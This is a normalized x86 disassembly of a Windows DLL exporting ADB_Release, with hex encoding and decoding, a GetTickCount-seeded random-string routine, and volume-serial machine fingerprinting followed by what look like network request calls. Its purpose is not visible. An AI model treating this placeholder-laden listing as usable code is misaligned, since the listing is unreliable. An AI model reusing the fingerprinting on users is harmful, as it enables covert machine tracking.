mov [ ebp - 0x10 ] esp
push 0x54
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
test esi esi
je r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_10013848
int3
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
push edx
call sub_1000f260
sub_1000f260
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cc16
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0x8 ]
lea edi [ esi + 0x4 ]
mov [ esi ] r--data
add eax 0x4
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push eax
or ecx 0xffffffff
xor ebx ebx
mov [ edi ] 0x0
call sub_10004820
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edx [ eax + 0x20 ]
lea edi [ esi + 0x24 ]
mov [ esi + 0x20 ] edx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] 0xf
add eax 0x24
mov [ edi ] cl
push eax
or ecx 0xffffffff
call sub_10004820
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
lea ecx [ esi + 0x40 ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1000f310
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000f310
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c918
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
xor edi edi
push 0x54
mov [ esi + 0x4 ] edi
call sub_10012ca7
add esp 0x4
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] edi
call sub_10012808
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_10013848
int3
mov [ esi ] eax
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ ebp + 0x8 ]
mov edx [ eax ]
push edi
push eax
push edx
push ecx
push esi
call sub_1000f3d0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000f3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c8f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp eax [ ebp + 0x14 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0xc ]
add eax 0x8
push eax
mov eax [ ecx + 0x4 ]
lea esi [ ecx + 0x4 ]
push eax
push ecx
call sub_1000f1a0
mov ecx [ edi + 0x4 ]
mov edx 0x35e50d6
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x4 ] ecx
mov [ esi ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
push r--data
call sub_100126ab
sub_1000f457
mov esi [ ebp - 0x14 ]
cmp esi [ ebp + 0x10 ]
je r-xdata
push 0x0
push 0x0
call sub_10013848
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
lea ebx [ ebp + 0x8 ]
call sub_1000f040
mov esi [ esi ]
cmp esi [ ebp + 0x10 ]
jne r-xdata
sub_1000f4b0
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
push ebx
mov ebx [ eax + 0x44 ]
push esi
push edi
xor edi edi
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test edi edi
je r-xdata
lea esi [ eax + 0x8 ]
cmp [ esi + 0x18 ] 0x10
lea eax [ esi + 0x4 ]
jb r-xdata
mov ecx edi
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
dec ecx
mov eax [ eax ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push 0x8
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
inc edi
cmp edi ebx
jb r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] r--data
pop ebx
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1000f550
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
push ebx
add eax 0x24
cmp [ eax + 0x14 ] 0x10
push esi
push edi
jb r-xdata
mov [ ebp - 0x4 ] eax
mov edi eax
mov edi [ eax ]
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax 0xc
call sub_10011c70
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax 0xd
call sub_10011c70
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax esi
cmp ebx eax
jae r-xdata
mov eax 0xc
call sub_10011c70
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax 0xc
call sub_10011c70
push esi
push eax
push edi
call sub_1001347c
add esp 0xc
test eax eax
jne r-xdata
mov eax 0xd
call sub_10011c70
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax 0xd
call sub_10011c70
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edi eax
mov eax 0xd
call sub_10011c70
push ebx
sub esi edi
add esi [ ebp - 0x4 ]
push eax
push esi
call sub_1001347c
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
inc eax
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f670
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov edx eax
push esi
lea esi [ edx + 0x1 ]
lea ecx [ ecx ]
mov bl [ edx ]
inc edx
test bl bl
jne r-xdata
mov ecx [ ecx + 0x4 ]
sub edx esi
add ecx 0x4
mov esi edx
call sub_10004db0
pop esi
pop ebx
pop ebp
retn 0x4
sub_1000f6a0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000f6f0
push ebp
mov ebp esp
sub esp 0x554
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov eax 0xe
mov esi ecx
call sub_10011c70
mov ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x554 ]
push edx
call sub_10013316
mov edi [ esi + 0x4 ]
lea eax [ ebp - 0x554 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
lea ecx [ edi + 0x24 ]
lea eax [ ebp - 0x554 ]
call sub_10004db0
lea ecx [ edi + 0x40 ]
call sub_1000f090
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x20 ] 0x0
pop edi
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
sub_1000f770
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cb4b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x8
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x4 ]
mov ebx r--data
call sub_1000dfb0
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
mov eax esi
sub_1000f7e0
push ebp
mov ebp esp
push ecx
mov eax 0xc
mov [ ebp - 0x4 ] ecx
call sub_10011c70
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebx
sub eax edx
push esi
mov esi eax
push edi
mov eax 0xd
call sub_10011c70
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp + 0xc ]
sub eax edx
lea eax [ eax + edi * 2 ]
lea ecx [ eax + esi + 0x1 ]
push ecx
call sub_10012766
mov ebx eax
add esp 0x4
mov eax 0xc
call sub_10011c70
mov edx ebx
sub edx eax
lea esp [ esp ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor ecx ecx
lea esi [ eax + ebx ]
test edi edi
je r-xdata
mov eax 0xd
call sub_10011c70
sub esi eax
mov edi [ ebp + 0x8 ]
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x4 ]
mov eax ebx
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea edx [ eax - 0xa ]
cmp dl 0x5
ja r-xdata
add al 0x30
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
lea ecx [ edi + 0x24 ]
mov eax ebx
call sub_10004db0
lea ecx [ edi + 0x40 ]
call sub_1000f090
push ebx
mov [ edi + 0x20 ] 0x0
call sub_10012e64
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor al al
add al 0x57
jmp r-xdata
mov [ esi ] al
mov al [ ecx + edi ]
and al 0xf
cmp al 0x9
ja r-xdata
lea edx [ eax - 0xa ]
cmp dl 0x5
ja r-xdata
add al 0x30
jmp r-xdata
xor al al
add al 0x57
jmp r-xdata
mov [ esi + 0x1 ] al
inc ecx
add esi 0x2
cmp ecx [ ebp + 0xc ]
jb r-xdata
mov al [ ecx + edi ]
sar al 0x4
and al 0xf
cmp al 0x9
ja r-xdata
sub_1000f910
push ebp
mov ebp esp
push esi
push 0x8
mov esi ecx
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x40 ]
mov ecx [ edx ]
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
add ecx 0x8
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn 0x4
dec edx
mov ecx [ ecx ]
jne r-xdata
sub_1000f950
push esi
push edi
mov edi [ ecx + 0x4 ]
add edi 0x24
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov edi [ edi ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
call sub_10012766
mov esi eax
add esp 0x4
mov ecx edi
sub esi edi
mov edi edi
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
retn
sub_1000f9c0
push esi
push edi
mov edi [ ecx + 0x4 ]
lea ecx [ edi + 0x40 ]
call sub_1000f090
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
mov [ edi + 0x20 ] 0x1
pop edi
pop esi
retn
sub_1000f9f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov [ eax ] 0x0
push esi
mov esi ecx
mov [ ebx ] 0x0
mov edx [ esi ]
mov eax [ edx + 0x44 ]
call eax
test eax eax
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov esi [ esi + 0x4 ]
add esi 0x24
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax 0xc
call sub_10011c70
lea edx [ eax + 0x1 ]
mov esi [ esi ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push edi
lea edi [ eax + esi ]
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax 0xd
call sub_10011c70
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
sub esi eax
mov eax esi
test al 0x1
jne r-xdata
pop edi
shr eax 0x1
push eax
mov [ ebx ] eax
call sub_10012766
mov ecx [ ebp + 0x8 ]
xor esi esi
add esp 0x4
mov [ ecx ] eax
cmp [ ebx ] esi
jbe r-xdata
lea ecx [ ecx ]
mov al [ edi + esi * 2 + 0x1 ]
lea edx [ eax - 0x30 ]
cmp dl 0x9
ja r-xdata
lea edx [ eax - 0x61 ]
cmp dl 0x5
ja r-xdata
lea edx [ eax - 0x61 ]
cmp dl 0x5
ja r-xdata
mov al dl
jmp r-xdata
lea ecx [ eax - 0x41 ]
cmp cl 0x5
ja r-xdata
sub al 0x57
mov cl al
jmp r-xdata
lea edx [ eax - 0x41 ]
cmp dl 0x5
ja r-xdata
sub al 0x57
jmp r-xdata
shl cl 0x4
or cl al
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + edx ] cl
inc esi
cmp esi [ ebx ]
jb r-xdata
xor cl cl
sub al 0x37
mov cl al
jmp r-xdata
xor al al
sub al 0x37
jmp r-xdata
mov al [ edi + esi * 2 ]
lea ecx [ eax - 0x30 ]
cmp cl 0x9
jbe r-xdata
sub_1000fb10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x4 ]
mov ecx eax
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ edi + 0x24 ]
call sub_10004db0
lea ecx [ edi + 0x40 ]
call sub_1000f090
mov [ edi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn 0x4
sub_1000fb50
push esi
push edi
mov edi [ ecx + 0x4 ]
lea ecx [ edi + 0x40 ]
call sub_1000f090
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
mov [ edi + 0x20 ] esi
pop edi
pop esi
retn
ADB_Release
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
push eax
call sub_10010c50
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0xc ]
add esp 0x4
mov ecx esi
call eax
mov edx [ esi ]
mov edi eax
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_1000fc40
push ebp
mov ebp esp
sub esp 0x374
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov eax 0x10
mov esi ecx
call sub_10011c70
mov edi eax
mov eax 0x11
call sub_10011c70
mov ebx eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
push eax
push edi
lea eax [ ebp - 0x374 ]
push ebx
push eax
call sub_10013316
lea eax [ ebp - 0x374 ]
add esp 0x10
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
call sub_10012ca7
lea ecx [ ebp - 0x374 ]
mov esi eax
mov edx ecx
add esp 0x4
sub esi edx
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn
sub_1000fcf0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001bdb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov eax 0xf
call sub_10011c70
mov esi eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] r--data
test eax eax
jne r-xdata
mov ecx esi
mov [ esp + 0x28 ] 0x0
lea edi [ ecx + 0x1 ]
mov edi edi
call [ GetTickCount@IAT ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
mov ebx ecx
mov ecx esi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
imul eax eax 0x660d
sub ecx esi
lea esi [ eax - 0xca1 ]
and esi 0xffff
xor edx edx
shr ecx 0x3
mov eax esi
div ecx
mov eax 0xcccccccd
mov [ esp + 0x18 ] esi
mov edi edx
mul ebx
shr edx 0x2
add edi edx
lea ebx [ edi + 0x1 ]
push ebx
call sub_10012ca7
push ebx
push 0x0
push eax
mov [ esp + 0x24 ] eax
call sub_10018220
add esp 0x10
xor ecx ecx
test edi edi
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esp + 0x10 ]
lea ebx [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
imul esi esi 0x660d
sub eax ebx
sub esi 0xca1
mov ebx eax
and esi 0xffff
xor edx edx
mov eax esi
div ebx
mov eax [ esp + 0x10 ]
inc ecx
mov dl [ edx + eax ]
mov eax [ esp + 0x14 ]
mov [ ecx + eax - 0x1 ] dl
cmp ecx edi
jl r-xdata
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000fe40
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov [ esi ] r--data
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_10012c4b
add esp 0x4
mov [ esi + 0x10 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000fe90
push ebp
mov ebp esp
sub esp 0xbd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn
push 0x5e5
lea eax [ ebp - 0xbd0 ]
push eax
call [ GetSystemDirectoryW@IAT ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
lea edx [ ebp - 0xbd4 ]
push edx
push ecx
push ecx
lea eax [ ebp - 0xbd0 ]
push eax
mov [ ebp - 0xbca ] cx
mov [ ebp - 0xbd4 ] ecx
call [ GetVolumeInformationW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xbd4 ]
mov [ esi + 0x4 ] ecx
sub_1000ff20
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000ff70
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
push eax
mov [ edi + 0x10 ] eax
add edx 0x54
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_100106c0
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
sub_1000ffa0
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
push eax
mov [ edi + 0x10 ] eax
add edx 0x70
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_100106c0
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
sub_1000ffd0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push edi
mov [ ebp - 0x8 ] ecx
push 0x0
mov ecx esi
call edx
mov edi eax
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
mov esi eax
mov eax 0x13
call sub_10011c70
mov [ ebp - 0x4 ] eax
mov eax 0x14
call sub_10011c70
mov [ ebp + 0x8 ] eax
test esi esi
je r-xdata
xor eax eax
mov edx esi
lea eax [ edx + 0x1 ]
lea ebx [ ebx ]
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push esi
push eax
push edi
push ecx
mov ecx [ ebp + 0x8 ]
sub edx ebx
call sub_10010080
push edi
mov ebx eax
call sub_10012e64
add esp 0x4
test esi esi
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx eax
mov eax edx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
call sub_10012e64
add esp 0x4
mov edx [ ebp + 0x8 ]
lea ebx [ edx + 0x1 ]
sub_10010080
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d0fc
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1e50
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1e08 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x1dfc ] eax
mov eax [ ebp + 0x14 ]
push 0x3c
mov [ ebp - 0x1e0c ] ecx
mov [ ebp - 0x1e18 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x1e20 ] eax
mov eax [ ebp + 0x20 ]
lea ecx [ ebp - 0x1e5c ]
push 0x0
push ecx
mov [ ebp - 0x1e1c ] edx
mov [ ebp - 0x1e10 ] eax
call sub_10018220
push 0x54d
mov [ ebp - 0x1e5c ] 0x3c
mov [ ebp - 0x1e48 ] 0x54d
call sub_10012766
mov edx [ ebp - 0x1e48 ]
push edx
push 0x0
push eax
mov [ ebp - 0x1e4c ] eax
call sub_10018220
push 0x9e5
mov [ ebp - 0x1e2c ] 0x9e5
call sub_10012766
mov ecx [ ebp - 0x1e2c ]
push ecx
push 0x0
push eax
mov [ ebp - 0x1e30 ] eax
call sub_10018220
mov eax esi
add esp 0x2c
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x1e5c ]
push ecx
push __dos_header
sub eax edi
push eax
push esi
call edx
test eax eax
jne r-xdata
mov eax [ ebp - 0x1e44 ]
mov ecx [ ebp - 0x1e4c ]
mov edx [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x8 ]
push ecx
mov ecx [ edx + 0x1c ]
push eax
call ecx
mov [ ebp - 0x1e00 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x1e4c ]
push eax
call sub_10012e64
mov ecx [ ebp - 0x1e30 ]
push ecx
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x1dd4 ]
call sub_1000ff70
mov [ ebp - 0x4 ] 0x0
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x1db8 ]
call sub_1000ffa0
mov eax 0x15
mov [ ebp - 0x4 ] 0x1
call sub_10011c70
mov edi eax
mov [ ebp - 0x1df4 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x1e4c ]
push edx
call sub_10012e64
mov eax [ ebp - 0x1e30 ]
push eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
push edi
call sub_1001347c
add esp 0xc
test eax eax
mov eax 0x800000
je r-xdata
call sub_10012e64
add esp 0x8
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
xor edx edx
cmp edx [ ebp - 0x1dc4 ]
mov ecx [ ecx + 0x14 ]
sbb edx edx
and edx 0x3c0000
push 0x0
add edx 0x40000
or edx eax
mov eax [ ebp - 0x1e30 ]
or edx 0x4000300
push edx
mov edx [ ebp - 0x1dfc ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebp - 0x1e00 ]
push edx
push eax
call ecx
mov edx [ ebp - 0x1e4c ]
push edx
mov [ ebp - 0x1e04 ] eax
call sub_10012e64
mov eax [ ebp - 0x1e30 ]
push eax
call sub_10012e64
mov eax edi
add esp 0x8
mov [ ebp - 0x1dfc ] 0x1
lea ecx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ ebp - 0x1df4 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push esi
push edi
call sub_1001347c
mov edi [ ebp - 0x1e04 ]
add esp 0xc
test eax eax
jne r-xdata
xor esi esi
mov ecx [ ebx + 0x4 ]
push 0x4
lea edx [ ebp - 0x1df4 ]
push edx
push 0x1f
mov [ ebp - 0x1df4 ] 0xf380
mov eax [ ecx + 0x28 ]
push edi
call eax
xor esi esi
cmp eax esi
jne r-xdata
mov edx [ ebp - 0x1e0c ]
mov eax [ ebp - 0x1e20 ]
mov ecx [ ebx + 0x4 ]
mov ecx [ ecx + 0x10 ]
push edx
mov edx [ ebp - 0x1e18 ]
push eax
mov eax [ ebp - 0x1e08 ]
push edx
push eax
push edi
call ecx
test eax eax
je r-xdata
mov [ ebp - 0x1df4 ] 0xd
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1dfc ] esi
cmp [ ebp - 0x1dc4 ] esi
jbe r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
push edi
call eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x1e00 ]
mov eax [ ecx + 0x8 ]
push edx
call eax
mov ebx [ ebp - 0x1dfc ]
mov edi [ ebp - 0x1d9c ]
test ebx ebx
je r-xdata
mov [ ebp - 0x1df8 ] 0x0
lea ebx [ ebx ]
mov [ ebp - 0x1d88 ] 0xf
mov [ ebp - 0x1d8c ] esi
